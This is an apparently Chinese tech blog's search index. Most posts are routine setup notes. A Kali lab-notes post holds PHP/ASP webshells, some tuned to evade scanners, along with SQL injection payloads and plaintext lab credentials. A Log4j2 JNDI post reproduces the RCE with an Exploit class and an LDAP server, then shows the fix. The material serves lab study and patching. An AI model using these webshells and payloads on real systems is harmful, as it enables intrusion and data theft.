[{"content":"你好，我是第一篇博客。\n","permalink":"https://naiba.fun/post/tech/test/","summary":"你好，我是第一篇博客。","title":"Test"},{"content":"","permalink":"https://naiba.fun/post/security/dvwa%E9%9D%B6%E5%9C%BA%E8%AF%95%E7%82%BC/","summary":"","title":"Dvwa靶场试炼"},{"content":"gogs官网 https://gogs.io/\n1.安装git yum install -y git\n2.下载git,可以去官网下载 wget https://dl.gogs.io/0.13.0/gogs_0.13.0_linux_amd64.tar.gz\n#默认端口3000 nohup ./gogs web \u0026amp;\u0026gt;/dev/null \u0026amp;\n","permalink":"https://naiba.fun/post/centos%E6%90%AD%E5%BB%BAgogs/","summary":"gogs官网 https://gogs.io/ 1.安装git yum install -y git 2.下载git,可以去官网下载 wget https://dl.gogs.io/0.13.0/gogs_0.13.0_linux_amd64.tar.gz #默认端口3000 nohup ./gogs web \u0026amp;\u0026gt;/dev/null \u0026amp;","title":"Centos搭建gogs"},{"content":"环境：\nspring boot:2.6.2\nopentracing-spring-jaeger-cloud-starter:3.2.2\njaeger-client:1.6.0\n\u0026lt;!--jaeager--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.opentracing.contrib\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;opentracing-spring-jaeger-cloud-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.jaegertracing\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jaeger-client\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.6.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 注意:\nopentracing-spring-jaeger-cloud-starter不支持最新版本的spring-cloud-starter-openfeign。 spring-cloud-starter-openfeign中的LoadBalancerFeignClient被移除了。\n所以我们需要自己创建下,直接复制\npackage org.springframework.cloud.openfeign.ribbon; public class CachingSpringLoadBalancerFactory { } package org.springframework.cloud.openfeign.ribbon; import feign.Client; public class LoadBalancerFeignClient { public LoadBalancerFeignClient(Client delegate, CachingSpringLoadBalancerFactory lbClientFactory, SpringClientFactory clientFactory) { throw new UnsupportedOperationException(); } public Client getDelegate() { throw new UnsupportedOperationException(); } } package org.springframework.cloud.openfeign.ribbon; public class SpringClientFactory { } docker直接部署jaeger\ndocker run -d --name jaeger \\ -e COLLECTOR_ZIPKIN_HOST_PORT=:9411 \\ -p 5775:5775/udp \\ -p 6831:6831/udp \\ -p 6832:6832/udp \\ -p 5778:5778 \\ -p 16686:16686 \\ -p 14250:14250 \\ -p 14268:14268 \\ -p 14269:14269 \\ -p 9411:9411 \\ jaegertracing/all-in-one:1.33 配置jeager的相关参数\nopentracing: jaeger: enabled: true # 启用对接Jaeger（可以不配置，默认true） enable128-bit-traces: true # 使用短TraceID（可以不配置） udp-sender: udp-sender: host: 192.168.5.110 # 配置Jaeger服务器地址 jeager-ui地址: http://localhost:16686\n其他链路追踪对比 如果只需要traceId 可以只需要引入\n\u0026lt;!--链路追踪 start--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-sleuth\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.0.0.RELEASE\u0026lt;/version\u0026gt; \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;scope\u0026gt;import\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--链路追踪 end--\u0026gt; 即可获取到\nimport brave.Tracer; @Service public class Breadcrumb { @Autowired private Tracer tracer; public String breadcrumbId() { return tracer.currentSpan().context().traceIdString(); } } ","permalink":"https://naiba.fun/post/9_springboot%E9%93%BE%E8%B7%AF%E8%BF%BD%E8%B8%AAjaeger/","summary":"\u003cp\u003e环境：\u003cbr\u003e\nspring boot:2.6.2\u003cbr\u003e\nopentracing-spring-jaeger-cloud-starter:3.2.2\u003cbr\u003e\njaeger-client:1.6.0\u003c/p\u003e","title":"spring boot集成jaeger实现链路管理"},{"content":"服务器信息 kali 登录 root/123456 haha/123456 mariaDB root/xujuntao systemctl status apache2 #数据库apache2用户的是自带的 数据库是mariaDB systemctl status mysqld 重启之后,需要先停止mariaDB 启动小皮mysql-3307后,在启动mariaDB-3306 haha/123456 47.95.244.155 http://47.95.244.155:19081/haha19081#/home/site/ 开放端口:19082/19089 #nginx /etc/nginx/conf.d #这个需要启动小皮面板 /usr/local/phpstudy/vhost/nginx/0127.0.0.1_81.conf 技巧 base64加密规则 \u0026lsquo;Hello!!\u0026rsquo; 的Base64编码的结果为 SGVsbG8hIQAA。\n一句话 #asp一句话 \u0026lt;%eval request(\u0026#34;heroes\u0026#34;)%\u0026gt; #php一句话木马 \u0026lt;?php @eval($_POST[\u0026#39;cmd\u0026#39;]);?\u0026gt; #aspx一句话木马 \u0026lt;%@Page Language=\u0026#34;Jscript\u0026#34;%\u0026gt; \u0026lt;%eval(Request.Item[\u0026#34;value\u0026#34;])%\u0026gt; 图片马 #linux 和macb 将file1.txt追加到file2.jpg后面的方法： cat post.php \u0026gt;\u0026gt; 1.jpg 若要将两个文件合并成第三个文件，而不是追加，那么用命令： cat 1.jpg post.php \u0026gt;\u0026gt; 2.jpg #windows copy 1.jpg/b + post.php 2.jpg 软件 #apache2 安装 sudo apt update \u0026amp;\u0026amp; sudo apt upgrade -y sudo apt install apache2 sudo systemctl start apache2 sudo systemclt enable apache2 systemctl status apache #开启ssh远程登录 将#PasswordAuthentication no的注释去掉，并且将NO修改为YES 将#PermitRootLogin yes的注释去掉 #设置ssh 开机启动 update-rc.d ssh enable #状态 /etc/init.d/ssh status #更新mysql root密码 set password for root@localhost = password(\u0026#39;123456\u0026#39;); #设置允许远程访问 grant all privileges on *.* to \u0026#39;root\u0026#39;@\u0026#39;%\u0026#39; identified by \u0026#39;123456\u0026#39; with grant option; flush privileges; #创建用户并授权 CREATE USER \u0026#39;dvwa\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;dvwa\u0026#39;; GRANT ALL ON dvwa.* TO \u0026#39;dvwa\u0026#39;@\u0026#39;%\u0026#39;; #apache 项目路径 /var/www/html burp suite 代理配置 浏览器代理地址\nbp配置代理,clashX在此配置\n插件 #验证码 https://github.com/c0ny1/captcha-killer 蚁剑 冰蝎 sqlmap 安装路径:\n​\t/usr/share/sqlmap\n配置文件:\n​\t/usr/share/doc/sqlmap/examples\n【通用参数】 -s 从存储文件里加载session -t 记录所有得http流量到一个文本文件 –batch 使用默认配置，不管用户得输入 –charset 强制数据检索编码格式 –crawl 从目标网站开始爬取网站 –csv-del CSV输出文件使用得分割字符 –dump-format dump数据得格式 –eta 显示输出得预计用时 –flush-session 为当前目标刷新session文件 –forms 在目标url上解析和测试表单 –fresh-queries 忽略在session文件里得查询结果 –hex 使用DBMS得hex函数进行数据检索 –output-dir 输出路径 –parse-errors 解析和列出DBMS得相应错误信息 –pivol-colimn 主列名称 –save 保存选项到一个ini配置文件 –scope 指定正则表达式从提供得代理日志里过滤目标 –test-filter 选择测试payload –update 更新sqlmap 【混杂参数】 -z 使用短助记符 –alert 当发现sql注入式，运行主机os命令 –answers 设置问题答案 –beep 当发现sql注入时，发出蜂鸣声 –cleanup 从sqlmap特定得udf和表里清除dbms –dependencies 检查sqlmap缺少得依赖关系 –disabie-coloring 禁用控制台出书颜色 –gpage 指定使用得google dork响应得页码 –identify-waf 绕过waf,ips,ids –mobile 使用UA模拟成智能手机 –page-rank 展示google dork结果得页码值 –purge-output 从输出目录安全移除所有内容 –smart 在积极启发得情况下进行彻底得测试 –sqlmap-shell 构建一个交互式sqlmap shell –wizard 初学者简单向导 这两项内容数据常用技巧类搭配动作，可根据翻译使用，需要注意得几个参数： –batch 在使用sqlmap时，有时一些响应需要用户交互，输入Y，N，sky，quit等，使用此选项可使用默认配置 –output-dir=指定输出路径，方式控制台输出过多，无法查看，也方便记录 –gpage 默认使用google搜索得前100个文件，当使用前面得-g参数，配合此参数指定页面 –identify-waf 进行WAF/IPS/IDS保护测试 –mobile 使用移动产品UA，把sqlmap伪装成手机，也可使用前面得-user-angent自己指定 –smart 只能深度启发式扫描，获取会有惊喜 –wizard 和上面得完全不同，纯新手选择，一步步让你输入url等参数 #对多个目标进行探测 -l 从bp或者webScarab proxy中读取http请求日志文件 #利用google 批量进行探测 sqlmap -g \u0026#34;inurl:.php?id=1\u0026#34; #连接已知数据库 sqlmap -d \u0026#34;mysql://dvwa:dvwa@127.0.0.1:3306/dvwa\u0026#34; -f --banner #环境信息 --current-user #当前用户，常用，直接用--current-user --current-db #当前数据库，常用，直接用--current-db --dbs #返回数据库 --users #返回所有用户 --password #返回用户名密码 -D security #指定数据库 -T users\t#指定表名 -C id password #指定列名 --os-shell #模拟一个可以执行的任意命令的shell --os-cmd #执行命令 --risk\t#风险（1-4，默认1）升高风险等级会增加数据被篡改的风险。risk 2：基于事件的测试;risk 3：or语句的测试;risk 4：update的测试 --level #设置测试的等级（1-5，默认为1）lv2：cookie; lv3：user-agent，refere; lv5：host 在sqlmap/xml/payloads文件内可以看见各个level发送的payload -proxy=http:// #设置代理 -batch #非交互模式 -p\t#指定sql注入点 靶场地址 BeesCMS #启动phpwebstudy http://172.16.10.7:81/beescms/admin/login.php admin/admin http://172.16.10.7:81/beescms/ sqli-labs php7/8下载地址\nhttps://github.com/h-t-m/sqli-labs-php8.1\n问题:数据无返回 手动在目录下面新建一个result.txt文件\n用脚本分别同步一份到各个目录\n#!/bin/bash # 目标目录 destination_directory=\u0026#34;/var/www/html/sqli-labs\u0026#34; # 指定的文件 source_file=\u0026#34;/var/www/html/sqli-labs/result.txt\u0026#34; # 获取以 \u0026#34;Less\u0026#34; 开头的文件夹，并将指定文件拷贝到每个目录 find . -maxdepth 1 -type d -name \u0026#34;Less*\u0026#34; -exec cp \u0026#34;$source_file\u0026#34; \u0026#34;$destination_directory\u0026#34;/{} \\; 然后把文件设置为777\nchmod -R 777 sqli-labs dvwa upload-labs 第三关\n只校验了php,没有校验php3,php5等\n我们可以上传post.php3 上传成功,复制地址\n显示File not found.\n我的靶场是 nginx+php5.5.38\n需要修改nginx\n#匹配php3 php5结尾 location ~ [^/]\\.php(3|5/|$) { root /var/www/nginx/; fastcgi_pass 127.0.0.1:5538; fastcgi_split_path_info ^(.+\\.php)(.*)$; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param PATH_INFO $fastcgi_path_info; include fastcgi.conf; } 再次访问,提示 Access denied. 需要修改php-fpm.conf 把前面的;去掉 security.limit_extensions= 重启nginx 常见漏洞攻防 相关配置 #数据库配置文件 /etc/mysql/mariadb.conf.d/50-server.cnf #apache2路径 /var/www/html #开启查看sql执行记录 tail -100f /var/www/mysql.log ​\nphp #只支持单条执行 mysql_query() #允许多条执行 mysqli_multi_query() sqli-labs Less1 #获取查询字段数 ?id=1\u0026#39; order by 3,\u0026#39;1 #正常 ?id=1\u0026#39; order by 4,\u0026#39;1 #报错 #获取数据库 ?id=-1\u0026#39; union select 1,database(),\u0026#39;3 #获取表名 ?id=-1\u0026#39; union select 1,2, group_concat(table_name) from information_schema.tables where table_schema = database() order by \u0026#39;1 #字段 ?id=-1\u0026#39; union select 1,2, group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = \u0026#39;users\u0026#39; order by \u0026#39;1 #值 ?id=-1\u0026#39; union select 1,2, group_concat(concat_ws(\u0026#39;~\u0026#39;,id,username,password)) from users order by \u0026#39;1 Less2 #列数 ?id=1 order by 3 ?id=1 order by 4 #库 ?id=-1 union select 1,2,database() #表 ?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database() #字段 ?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema = database() and table_name= \u0026#39;users\u0026#39; #值 ?id=-1 union select 1,2,group_concat(concat_ws(\u0026#39;~\u0026#39;,id,username,password)) from users Less3 #列数 ?id=1 order by 3 ?id=1 order by 4 #库 ?id=-1 union select 1,2,database() #表 ?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database() #字段 ?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema = database() and table_name= \u0026#39;users\u0026#39; #值 ?id=-1 union select 1,2,group_concat(concat_ws(\u0026#39;~\u0026#39;,id,username,password)) from users Less4 Less5 #数据库 id=-1\u0026#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) order by \u0026#39;1 #爆表名 id=-1\u0026#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e)) order by \u0026#39;1 #字段 id=-1\u0026#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = database( ) and table_name = \u0026#39;users\u0026#39; limit 0,2),0x7e)) order by \u0026#39;1 #字段过多可以用not in id=-1\u0026#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = \u0026#39;users\u0026#39; and column_name not in (\u0026#39;user_id\u0026#39;,\u0026#39;first_name\u0026#39;,\u0026#39;last_name\u0026#39;,\u0026#39;user\u0026#39;,\u0026#39;password\u0026#39;)) ,0x7e)) order by \u0026#39;1 #查值 extractvalue(1,concat(0x7e,(select group_concat(username,password) from users ) ,0x7e)) order by \u0026#39;1 #长度过长 id=-1\u0026#39; and extractvalue(1,concat(0x7e,(select group_concat( concat_ws(\u0026#39;_\u0026#39;,username,password) ) from users where username not in (\u0026#39;Dumb\u0026#39;,\u0026#39;Angelina\u0026#39;) ) ,0x7e)) order by \u0026#39;1 XSS SQL Injection 注释方式\n# 号注释 %23 注释 \u0026ndash;+ 注释 #mysql #判断系统sql查询了几列 3-代表根据第三列排序 id=-1 order by 3 # #查询数据库 id=-1 union select version(),database() # #-----没什么用 1 and 1=2 union select 1,concat(database(),floor(rand(0)*2))x from information_schema.tables group by x # #获取表 id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema = database() #获取表中字段 直接用users会报错,直接转成16进制(0x7573657273) id=-1 union select 1, group_concat(column_name) from information_schema.columns where able_schema=database() and table_name=0x7573657273 # #查询具体字段值-有时需要加上随机数 id = -1 union select table_name,concat((select group_concat(user_id,user,password) from users))x from information_schema.tables where table_schema = database() group by x # #可用----参考 id = -1 union select table_name,concat((select group_concat(user_id,user,password) from users),floor(rand(0)*2))x from information_schema.tables group by x # 宽字节注入 **如果需要使用宽字节注入需要满足的条件** 1)采用了addslashes函数进行了转义 2)网站采用的是GBK编码方式 报错注入 webshell 一句话木马 \u0026lt;?php $ab = $_REQUEST[\u0026#39;pass\u0026#39;]; $a[\u0026#39;t\u0026#39;] = \u0026#34;\u0026#34;;//主要带对象 D盾就不管后面的了。。。 eval($a[\u0026#39;t\u0026#39;].$ab); ?\u0026gt; \u0026lt;?php $a = $_REQUEST[\u0026#39;pass\u0026#39;];//参数 $a = \u0026#34;$a\u0026#34;;//狗不会二次检测 $b[\u0026#39;test\u0026#39;] = \u0026#34;\u0026#34;;//主要怕太特殊情况状态码:500 eval($b[\u0026#39;test\u0026#39;].\u0026#34;$a\u0026#34;);//跟之前一样。。 ?\u0026gt; \u0026lt;?php eval($_GET[pass]);?\u0026gt; \u0026lt;?php eval(\u0026#34;echo $_GET[pass];\u0026#34;);?\u0026gt; ?pass=system(\u0026#34;ifconfig\u0026#34;) ?pass=system(\u0026#34;ls\u0026#34;) ?pass=system(\u0026#34;whoami\u0026#34;) #post eval里面不带分号,system命令执行不了? \u0026lt;?php eval(\u0026#34;$_POST[pass];\u0026#34;);?\u0026gt; \u0026lt;?php eval(\u0026#34;echo $_POST[pass];\u0026#34;);?\u0026gt; http://172.16.10.7/webshell/post.php #data: pass=phpinfo(); pass=system(\u0026#34;ifconfig\u0026#34;); #php5 \u0026lt;?php @$a=$_COOKIE[1]; $b=\u0026#39;\u0026#39;; $c=\u0026#39;\u0026#39;; @assert($b.$a); ?\u0026gt; #cookie php8 不支持assert动态调用 \u0026lt;?php $a = eval($_POST[cmd]);$b = \u0026#39;\u0026#39;; $c = \u0026#39;\u0026#39;; @assert($b.$a); ?\u0026gt; #参考 https://www.cnblogs.com/KHZ521/p/12154671.html 小马 php\npyenv安装配置 pyenv -v pyenv 2.3.3 which pyenv /usr/local/bin/pyenv pyenv versions system * 2.7.18 (set by /Users/collin/.pyenv/version) ~ pyenv commands #查看pyenv指令列表 https://www.lucissfer.com/2018/05/29/pyenv%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/\nhttps://blog.51cto.com/u_14320361/2488888\nhttps://juejin.cn/post/7056800493753860103\nhttps://xushanxiang.com/mac-pyenv-python.html\nhttps://imho.plus/python2-in-mac-monterey/\n常用配置 1.配置网络 临时修改ip地址\nifconfig eth0 up //端口启用 ifconfig eth0 down //端口关闭 ifconfig eth0 192.168.1.10 //只修改ip地址 ifconfig eth0 192.168.1.10/24 或者 ifconfig eth0 1.1.1.1 netmask 255.0.0.0 //修改ip地址和掩码 临时修改网关\nroute //查看路由表 netstat -rn //查看路由表 route del default eth0 //删除eth0上的默认路由 route add default gw 192.168.1.1 //添加默认路由 永久修改ip地址和网关\n进入配置文件\n/etc/network/interfaces # This file describes the network interfaces available on your system # and how to activate them. For more information, see interfaces(5). # The loopback network interface auto lo iface lo inet loopback # The primary network interface allow-hotplug eth0 iface eth0 inet dhcp # This is an autoconfigured IPv6 interface iface eth0 inet6 auto 修改为： # This file describes the network interfaces available on your system # and how to activate them. For more information, see interfaces(5). # The loopback network interface auto lo iface lo inet loopback # The primary network interface allow-hotplug eth0 auto eth0 //增加了该选项，因为使用networking restart时系统启动 auto的网卡，如不加上则启动无反应 iface eth0 inet static //配置了static 为静态ip address 192.168.1.4 //设置ip地址 netmask 255.255.255.0 //设置掩码 gateway 192.168.1.1 //设置网关 # This is an autoconfigured IPv6 interface iface eth0 inet6 auto 配置dns\n/etc/resolv.conf nameserver 202.106.0.20 nameserver 202.106.46.151 修改为： nameserver 202.106.0.20 nameserver 202.106.46.151 nameserver 8.8.8.8 重启网卡\nservice networking restart或 /etc/init.d/networking restart\n启动网卡\nsudo ifconfig eth0 up 注1：修改/etc/network/interfaces（网卡配置文件）、/etc/resolv.conf（DNS配置文件）请先做好备份，以免出问题 。 注2：# The loopback network interface这处内容不能删除或注释掉，否则即使能上网，也能获取到IP地址，但是ping不通本地127.0.0.1地址导致postgresql等服务不能正常启动，Metasploit启动时也会提示错误信息 。\n注3：设置静态IP地址可能导致×××连接无反应，这时请将 # The primary network interface这处所有内容用#注释掉，然后使用service networking restart命令重启网络或reboot命令重启计算机 。\n2.配置国内源 vim /etc/apt/sources.list编辑软件源配置文件\n# 官方源 # deb http://http.kali.org/kali kali-rolling main non-free contrib # deb-src http://http.kali.org/kali kali-rolling main non-free contrib #根据需要自己选一个，中科大的还可以 #中科大 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib #阿里云 #deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib #deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib #清华大学 #deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙大 #deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free #deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free #东软大学 #deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib #deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib #重庆大学 #deb http://http.kali.org/kali kali-rolling main non-free contrib #deb-src http://http.kali.org/kali kali-rolling main non-free contrib apt update apt-get update 更新索引 apt-get upgrade 更新软件 apt-get dist-upgrade 升级 apt-get clean 删除缓存包 apt-get autoclean 删除未安装的deb包 3.输入法 apt install ibus ibus-pinyin C段存活探测 Cwebscanner 按照\npip install \u0026ndash;target=*目标路径 工具包名字*\n\u0026lt;domain\u0026gt;：指定域名\npython2 Cwebscan.py \u0026lt;domain\u0026gt; 指定端口号 python2 Cwebscan.py \u0026lt;domain\u0026gt; -p80 python2 Cwebscan.py \u0026lt;domain\u0026gt; -p80,443 子域名爆破工具 Subdomain3 Short Form Long Form Description -d \u0026ndash;domain 目标域名,例如: baidu.com -s \u0026ndash;speed 速度模式,三种速度模式:fast,medium,low -l \u0026ndash;level 例子: 2:w.baidu.com; 3:w.w.baidu.com; -f \u0026ndash;file 使用文件,每行一个子域名 -ns \u0026ndash;default_dns y为使用默认DNS；n为搜索最快的DNS； -c \u0026ndash;cname 开启CDN搜集,y或者n -f1 \u0026ndash;sub_file 一级域名字典 -f2 \u0026ndash;next_sub_file 二级域名字典 -f3 \u0026ndash;other_file 外部域名结果 ksubdomain 使用内置字典爆破 ksubdomain -d seebug.org 使用字典爆破域名 ksubdomain -d seebug.org -f subdomains.dict 字典里都是域名，可使用验证模式 ksubdomain -f dns.txt -verify 爆破三级域名 ksubdomain -d seebug.org -l 2 通过管道爆破 echo \u0026#34;seebug.org\u0026#34;|ksubdomain 通过管道验证域名 echo \u0026#34;paper.seebug.org\u0026#34;|ksubdomain -verify 仅使用网络API接口获取域名 ksubdomain -d seebug.org -api 完整模式,先使用网络API，在此基础使用内置字典进行爆破 ksubdomain -d seebug.org -full https://www.bilibili.com/read/cv14781111?from=search\nhttps://zhuanlan.zhihu.com/p/531680846\n","permalink":"https://naiba.fun/post/security/kali/","summary":"服务器信息 kali 登录 root/123456 haha/123456 mariaDB root/xujuntao systemctl status apache2 #数据库apache2用户的是自带的 数据库是mariaDB systemctl status mysqld 重启之后,需要先停止mariaDB 启动小皮my","title":"kali配置"},{"content":"11 22 33 //多线程-非单例 public class Singleton { private static Singleton INSTANCE; public static Singleton getInstance() { if (isNull(INSTANCE)) { try { Thread.sleep(1); INSTANCE = new Singleton(); } catch (InterruptedException e) { e.printStackTrace(); } } return INSTANCE; } public static void main(String[] args) { for (int i = 0; i \u0026lt; 10; i++) { new Thread(() -\u0026gt; System.out.println(Singleton.getInstance().hashCode())).start(); } } }\n","permalink":"https://naiba.fun/post/tech/singleton/","summary":"11 22 33 //多线程-非单例 public class Singleton { private static Singleton INSTANCE; public static Singleton getInstance() { if (isNull(INSTANCE)) { try { Thread.sleep(1); INSTANCE = new Singleton(); } catch (InterruptedException e) { e.printStackTrace(); } } return INSTANCE; } public static void main(String[] args) { for (int i = 0; i \u0026lt; 10; i++) { new Thread(() -\u0026gt; System.out.println(Singleton.getInstance().hashCode())).start(); } } }","title":"Singleton单例"},{"content":"模板：切记不要加/ 否则methodParameter方法获取不到值\n参考配置 ：https://blog.csdn.net/xiaoliulang0324/article/details/79030752\n入参 groovyScript( \u0026#34;if(\\\u0026#34;${_1}\\\u0026#34;.length() == 2) { return \u0026#39; * @param: null\u0026#39;; } else { def result=\u0026#39;\u0026#39;; def params=\\\u0026#34;${_1}\\\u0026#34;.replaceAll(\u0026#39;[\\\\\\\\[|\\\\\\\\]|\\\\\\\\s]\u0026#39;, \u0026#39;\u0026#39;).split(\u0026#39;,\u0026#39;).toList(); for(i = 0; i \u0026lt; params.size(); i++) { if(params[i] == \u0026#39;\u0026#39; || params[i] == \u0026#39;null\u0026#39;) { return \u0026#39; * @param: null\u0026#39;; }else{ result+=\u0026#39; * @param: \u0026#39; + params[i] + \u0026#39;--\u0026gt;\u0026#39; }; if(i+1\u0026lt;params.size()){ result+=\u0026#39;\\\\n\u0026#39;; }; }; return result; }\u0026#34;, methodParameters() ); 返回参数 groovyScript(\u0026#34;return \\\u0026#34;${_1}\\\u0026#34; == \u0026#39;void\u0026#39; ? \u0026#39;null\u0026#39; : \u0026#39;\u0026#39; + \\\u0026#34;${_1}\\\u0026#34;\u0026#34;, methodReturnType()) ","permalink":"https://naiba.fun/post/tips/idea-annotation/","summary":"","title":"Idea Annotation"},{"content":"下面会分四步介绍 概述 1.目的 模拟攻击自有项目，了解原理，修复漏洞 2.漏洞概述 该漏洞是由于Apache Log4j2某些功能存在递归解析功能，未经身份验证的攻击者通过发送特定恶意数据包，可在目标服务器上执行任意代码。 3.影响范围 Apache Log4j 2.x \u0026lt;= 2.15.0-rc1 4.流程图 图片中用rmi方式,我是用的ldap。 重现漏洞 1.环境版本 JDK：1.8.0_241 Maven：3.6.3 log4j2：2.14.1 2.代码实现 按照流程图标识顺序开始编写代码 第一步、完成恶意代码的编写,部署到服务器上 public class Exploit { public Exploit() { try { System.out.println(\u0026#34;进来了！进来了！\u0026#34;); // 要执行的命令 打开计算器 // mac String[] commands = {\u0026#34;open\u0026#34;, \u0026#34;/System/Applications/Calculator.app\u0026#34;}; //windows // Runtime.getRuntime().exec(\u0026#34;calc.exe\u0026#34;); Process pc = Runtime.getRuntime().exec(commands); pc.waitFor(); } catch (Exception e) { e.printStackTrace(); } } public static void main(String[] argv) { Exploit e = new Exploit(); } } 编译 Exploit.java 测试脚本 执行java Exploit 确保能成功打开计算器\n#进入Exploit.class所在目录,执行命令启动一个web服务 python3 -m http.server 8100 直接访问 http://127.0.0.1:8100/ 确保点击能把class下载下来\n第二部、搭建一个LDAP服务 这里会用到marshalsec反序列化工具 我已经打包好可以直接点击下载使用\n或者直接github上下载源码https://github.com/mbechler/marshalsec\n#进入marshalsec 然后执行打包命令 mvn clean package -DskipTests #执行命令启动服务 ldap默认端口是1389 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \u0026#34;http://127.0.0.1:8100/#Exploit\u0026#34; 第三部、编写含有log4j2的error输出接口(即被攻击者的接口，其实就是我们自己项目中含有error输出的接口) 这里我就直接在项目里面输出error日志了\npublic static void main(String[] args){ Logger logger = LogManager.getLogger(ExploitTest.class); // 根据自己版本，觉得是否取消注释下面这行代码, //因为JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。 // 那么是不是升级jdk版本就能避免这个问题了呢，其实不然，有其他方式可以绕过高版本JKD，进行注入攻击 // 这里演示的是最基础的方式，所以需要先把变量设为true， //System.setProperty(\u0026#34;com.sun.jndi.ldap.object.trustURLCodebase\u0026#34;,\u0026#34;true\u0026#34;); logger.error(\u0026#34;${jndi:ldap://127.0.0.1:1389/test}\u0026#34;); } 如果提示这个错误，也是需要设置System.setProperty(\u0026ldquo;com.sun.jndi.ldap.object.trustURLCodebase\u0026rdquo;,\u0026ldquo;true\u0026rdquo;)的 那么现在执行这个main方式是不是会打开计算器了，成功被注入\n修复 根据官方提示升级即可 Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later). 如果是springboot 第一种最简单的方式，就是在pom中指定版本号\n\u0026lt;properties\u0026gt; \u0026lt;log4j2.version\u0026gt;2.17.0\u0026lt;/log4j2.version\u0026gt; \u0026lt;/properties\u0026gt; ReImpot后应该能看到已经升级到了2.17.0了 第二种就是直接引入对应的jar包\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-api\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.17.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-slf4j-impl\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.17.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.17.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-jul\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.17.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; ","permalink":"https://naiba.fun/post/log4j2_cve-2021-44228-02/","summary":"下面会分四步介绍 概述 1.目的 模拟攻击自有项目，了解原理，修复漏洞 2.漏洞概述 该漏洞是由于Apache Log4j2某些功能存在递归解析功能，未","title":"Apache Log4j2 Jndi RCE 高危漏洞重现/修复"},{"content":"简介 Homebrew 是一款自由及开放源代码的软件包管理系统，用以简化 macOS 和 linux 系统上的软件安装过程。 它拥有安装、卸载、更新、查看、搜索等很多实用的功能，通过简单的一条指令，就可以实现包管理，十分方便快捷。\nHomebrew 主要有四个部分组成: brew、homebrew-core 、homebrew-bottles、homebrew-cask。\n名称 说明 brew Homebrew 源代码仓库 homebrew-core Homebrew 核心软件仓库 homebrew-bottles Homebrew 预编译二进制软件包 homebrew-cask 提供 macOS 应用和大型二进制文件 替换为阿里源\n查看brew.git当前源 cd \u0026#34;$(brew --repo)\u0026#34; \u0026amp;\u0026amp; git remote -v origin https://github.com/Homebrew/brew.git (fetch) origin https://github.com/Homebrew/brew.git (push) 查看homebrew-core.git当前源 cd \u0026#34;$(brew --repo homebrew/core)\u0026#34; \u0026amp;\u0026amp; git remote -v origin https://github.com/Homebrew/homebrew-core.git (fetch) origin https://github.com/Homebrew/homebrew-core.git (push) 修改brew.git为阿里源 